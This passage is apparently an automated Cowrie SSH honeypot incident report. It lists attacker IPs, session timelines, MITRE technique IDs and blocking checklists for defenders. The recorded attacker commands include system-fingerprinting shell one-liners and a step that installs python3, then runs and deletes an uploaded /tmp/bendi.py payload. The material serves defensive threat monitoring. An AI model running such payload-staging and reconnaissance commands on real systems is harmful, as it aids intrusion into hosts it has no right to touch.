| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:49:21` | `cowrie.session.connect` |
| `2026-08-15 19:49:21` | `cowrie.client.version` |
| `2026-08-15 19:49:21` | `cowrie.client.kex` |
| `2026-08-15 19:49:22` | `cowrie.login.success` |
| `2026-08-15 19:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b05f11c39d

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-15 19:49 |
| **Last Seen** | 2026-08-15 19:51 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:49:24` | `cowrie.session.connect` |
| `2026-08-15 19:49:24` | `cowrie.client.version` |
| `2026-08-15 19:49:24` | `cowrie.client.kex` |
| `2026-08-15 19:49:25` | `cowrie.login.success` |
| `2026-08-15 19:49:27` | `cowrie.session.file_upload` |
| `2026-08-15 19:49:28` | `cowrie.session.params` |
| `2026-08-15 19:49:28` | `cowrie.command.input` |
| `2026-08-15 19:49:28` | `cowrie.command.input` |
| `2026-08-15 19:49:28` | `cowrie.command.input` |
| `2026-08-15 19:49:28` | `cowrie.command.failed` |
| `2026-08-15 19:49:28` | `cowrie.log.closed` |
| `2026-08-15 19:49:29` | `cowrie.session.params` |
| `2026-08-15 19:49:29` | `cowrie.command.input` |
| `2026-08-15 19:49:29` | `cowrie.log.closed` |
| `2026-08-15 19:49:30` | `cowrie.session.params` |
| `2026-08-15 19:49:30` | `cowrie.command.input` |
| `2026-08-15 19:49:30` | `cowrie.log.closed` |
| `2026-08-15 19:49:31` | `cowrie.session.params` |
| `2026-08-15 19:49:31` | `cowrie.command.input` |
| `2026-08-15 19:49:31` | `cowrie.command.failed` |
| `2026-08-15 19:49:31` | `cowrie.command.failed` |
| `2026-08-15 19:50:33` | `cowrie.session.params` |
| `2026-08-15 19:50:33` | `cowrie.command.input` |
| `2026-08-15 19:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9ad0e3035d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:49 |
| **Last Seen** | 2026-08-15 19:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:49:28` | `cowrie.session.connect` |
| `2026-08-15 19:49:28` | `cowrie.client.version` |
| `2026-08-15 19:49:28` | `cowrie.client.kex` |
| `2026-08-15 19:49:31` | `cowrie.login.success` |
| `2026-08-15 19:49:33` | `cowrie.session.params` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.success` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.command.input` |
| `2026-08-15 19:49:33` | `cowrie.log.closed` |
| `2026-08-15 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a303eb3d6aa

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-08-15 19:50 |
| **Last Seen** | 2026-08-15 19:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:50:54` | `cowrie.session.connect` |
| `2026-08-15 19:50:55` | `cowrie.client.version` |
| `2026-08-15 19:50:55` | `cowrie.client.kex` |
| `2026-08-15 19:50:58` | `cowrie.login.success` |
| `2026-08-15 19:50:59` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502c39cec548

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]201` |
| **First Seen** | 2026-08-15 19:51 |
| **Last Seen** | 2026-08-15 19:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:51:04` | `cowrie.session.connect` |
| `2026-08-15 19:51:05` | `cowrie.client.version` |
| `2026-08-15 19:51:05` | `cowrie.client.kex` |
| `2026-08-15 19:51:08` | `cowrie.login.success` |
| `2026-08-15 19:51:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]201` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2454069a7d2b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:51 |
| **Last Seen** | 2026-08-15 19:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:51:14` | `cowrie.session.connect` |
| `2026-08-15 19:51:14` | `cowrie.client.version` |
| `2026-08-15 19:51:14` | `cowrie.client.kex` |
| `2026-08-15 19:51:17` | `cowrie.login.success` |
| `2026-08-15 19:51:18` | `cowrie.session.params` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.success` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:18` | `cowrie.command.input` |
| `2026-08-15 19:51:19` | `cowrie.log.closed` |
| `2026-08-15 19:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e9c3b1f5a1

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-15 19:51 |
| **Last Seen** | 2026-08-15 19:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:51:27` | `cowrie.session.connect` |
| `2026-08-15 19:51:27` | `cowrie.client.version` |
| `2026-08-15 19:51:30` | `cowrie.client.kex` |
| `2026-08-15 19:51:30` | `cowrie.login.success` |
| `2026-08-15 19:51:31` | `cowrie.session.params` |
| `2026-08-15 19:51:31` | `cowrie.command.input` |
| `2026-08-15 19:51:31` | `cowrie.log.closed` |
| `2026-08-15 19:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602a546de9f7

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-15 19:51 |
| **Last Seen** | 2026-08-15 19:53 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:51:34` | `cowrie.session.connect` |
| `2026-08-15 19:51:34` | `cowrie.client.version` |
| `2026-08-15 19:51:34` | `cowrie.client.kex` |
| `2026-08-15 19:51:35` | `cowrie.login.success` |
| `2026-08-15 19:51:37` | `cowrie.session.file_upload` |
| `2026-08-15 19:51:38` | `cowrie.session.params` |
| `2026-08-15 19:51:38` | `cowrie.command.input` |
| `2026-08-15 19:51:38` | `cowrie.command.input` |
| `2026-08-15 19:51:38` | `cowrie.command.input` |
| `2026-08-15 19:51:38` | `cowrie.command.failed` |
| `2026-08-15 19:51:38` | `cowrie.log.closed` |
| `2026-08-15 19:51:39` | `cowrie.session.params` |
| `2026-08-15 19:51:39` | `cowrie.command.input` |
| `2026-08-15 19:51:40` | `cowrie.log.closed` |
| `2026-08-15 19:51:40` | `cowrie.session.params` |
| `2026-08-15 19:51:40` | `cowrie.command.input` |
| `2026-08-15 19:51:41` | `cowrie.log.closed` |
| `2026-08-15 19:51:42` | `cowrie.session.params` |
| `2026-08-15 19:51:42` | `cowrie.command.input` |
| `2026-08-15 19:51:42` | `cowrie.command.failed` |
| `2026-08-15 19:51:42` | `cowrie.command.failed` |
| `2026-08-15 19:52:43` | `cowrie.session.params` |
| `2026-08-15 19:52:43` | `cowrie.command.input` |
| `2026-08-15 19:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff08ff4570c0

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 19:52 |
| **Last Seen** | 2026-08-15 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:52:07` | `cowrie.session.connect` |
| `2026-08-15 19:52:07` | `cowrie.client.version` |
| `2026-08-15 19:52:07` | `cowrie.client.kex` |
| `2026-08-15 19:52:08` | `cowrie.login.success` |
| `2026-08-15 19:52:09` | `cowrie.session.params` |
| `2026-08-15 19:52:09` | `cowrie.command.input` |
| `2026-08-15 19:52:09` | `cowrie.log.closed` |
| `2026-08-15 19:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ca2063415a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:52 |
| **Last Seen** | 2026-08-15 19:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:52:59` | `cowrie.session.connect` |
| `2026-08-15 19:52:59` | `cowrie.client.version` |
| `2026-08-15 19:52:59` | `cowrie.client.kex` |
| `2026-08-15 19:53:02` | `cowrie.login.success` |
| `2026-08-15 19:53:04` | `cowrie.session.params` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.success` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.command.input` |
| `2026-08-15 19:53:04` | `cowrie.log.closed` |
| `2026-08-15 19:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68c05d26c7f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:54 |
| **Last Seen** | 2026-08-15 19:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:54:49` | `cowrie.session.connect` |
| `2026-08-15 19:54:50` | `cowrie.client.version` |
| `2026-08-15 19:54:50` | `cowrie.client.kex` |
| `2026-08-15 19:54:52` | `cowrie.login.success` |
| `2026-08-15 19:54:54` | `cowrie.session.params` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.success` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.command.input` |
| `2026-08-15 19:54:54` | `cowrie.log.closed` |
| `2026-08-15 19:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee4ba945989

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:56 |
| **Last Seen** | 2026-08-15 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:56:40` | `cowrie.session.connect` |
| `2026-08-15 19:56:40` | `cowrie.client.version` |
| `2026-08-15 19:56:40` | `cowrie.client.kex` |
| `2026-08-15 19:56:43` | `cowrie.login.success` |
| `2026-08-15 19:56:44` | `cowrie.session.params` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.success` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:44` | `cowrie.command.input` |
| `2026-08-15 19:56:45` | `cowrie.log.closed` |
| `2026-08-15 19:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e395836827

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:58 |
| **Last Seen** | 2026-08-15 19:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:58:33` | `cowrie.session.connect` |
| `2026-08-15 19:58:35` | `cowrie.client.version` |
| `2026-08-15 19:58:35` | `cowrie.client.kex` |
| `2026-08-15 19:58:38` | `cowrie.login.success` |
| `2026-08-15 19:58:39` | `cowrie.session.params` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.success` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:39` | `cowrie.command.input` |
| `2026-08-15 19:58:40` | `cowrie.log.closed` |
| `2026-08-15 19:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114d87b8373b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:00 |
| **Last Seen** | 2026-08-15 20:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:00:26` | `cowrie.session.connect` |
| `2026-08-15 20:00:27` | `cowrie.client.version` |
| `2026-08-15 20:00:27` | `cowrie.client.kex` |
| `2026-08-15 20:00:30` | `cowrie.login.success` |
| `2026-08-15 20:00:31` | `cowrie.session.params` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.success` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:31` | `cowrie.command.input` |
| `2026-08-15 20:00:32` | `cowrie.log.closed` |
| `2026-08-15 20:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e2e12f52e63

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 20:01 |
| **Last Seen** | 2026-08-15 20:02 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:01:48` | `cowrie.session.connect` |
| `2026-08-15 20:01:55` | `cowrie.client.version` |
| `2026-08-15 20:01:55` | `cowrie.client.kex` |
| `2026-08-15 20:02:17` | `cowrie.login.success` |
| `2026-08-15 20:02:29` | `cowrie.session.params` |
| `2026-08-15 20:02:29` | `cowrie.command.input` |
| `2026-08-15 20:02:34` | `cowrie.log.closed` |
| `2026-08-15 20:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7a918afb91

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:02 |
| **Last Seen** | 2026-08-15 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:02:20` | `cowrie.session.connect` |
| `2026-08-15 20:02:21` | `cowrie.client.version` |
| `2026-08-15 20:02:21` | `cowrie.client.kex` |
| `2026-08-15 20:02:23` | `cowrie.login.success` |
| `2026-08-15 20:02:25` | `cowrie.session.params` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
